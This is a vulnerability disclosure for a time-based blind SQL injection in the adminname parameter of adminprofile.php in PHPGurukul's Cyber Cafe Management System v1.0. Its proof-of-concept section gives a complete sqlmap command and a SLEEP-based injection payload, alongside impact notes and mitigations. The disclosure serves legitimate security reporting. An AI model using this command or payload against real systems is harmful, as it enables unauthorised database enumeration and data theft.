# CVE-2025-70893 â€“ Time-Based Blind SQL Injection

## ğŸ“Œ Description
A time-based blind SQL Injection vulnerability exists in Cyber Cafe
Management System v1.0. The vulnerability affects the `adminname`
parameter in the `adminprofile.php` endpoint. User-supplied input is not
properly sanitized before being processed by the backend database.

An authenticated attacker with administrative privileges can exploit
this vulnerability by injecting crafted SQL payloads into the
`adminname` parameter, leading to database
information disclosure through time-based inference techniques.

## ğŸ§± Affected Product
- Product: Cyber Cafe Management System
- Vendor: PHPGurukul
- Version: v1.0

## ğŸ“‚ Affected Component
- File: `adminprofile.php`
- Parameter: `adminname`
- Request Method: POST

## ğŸ” Vulnerability Type
Time-Based Blind SQL Injection

## ğŸ¯ Attack Vector
The attacker sends a crafted HTTP POST request to the
`adminprofile.php` endpoint. The `adminname` parameter is vulnerable to
SQL injection due to improper input validation and lack of prepared
statements.

## âš ï¸ Impact
- Database enumeration
- Sensitive data disclosure
- Data manipulation

## ğŸ§ª Proof of Concept (PoC)

The vulnerability was confirmed using `sqlmap`.
The following request demonstrates the issue:

```bash
sqlmap -u "http://<TARGET-IP>/ccms/adminprofile.php" \
--data="adminname=Admin&username=admin&mobilenumber=XXXXXXXXXX&email=admin@example.com&submit=" \
-p adminname \
--cookie="PHPSESSID=<SESSION_ID>" \
--technique=T \
--time-sec=5 \
--risk=3 \
--level=5 \
--dbs \
--batch
```

```bash
---
Parameter: adminname (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: adminname=Admin' AND (SELECT 4942 FROM (SELECT(SLEEP(5)))PdrU)-- -
---
```

![Time-Based SQL Injection PoC](/images/timebased-sqli.png)

## Mitigation
- Implement prepared statements (parameterized queries)
- Apply strict server-side input validation
- Sanitize and encode all user-supplied input
- Use least-privilege database accounts

## ğŸ”— References
- https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/
- https://phpgurukul.com/?sdm_process_download=1&download_id=21779

## ğŸ‘¤ Discoverer
Efe Kaan AKKAR
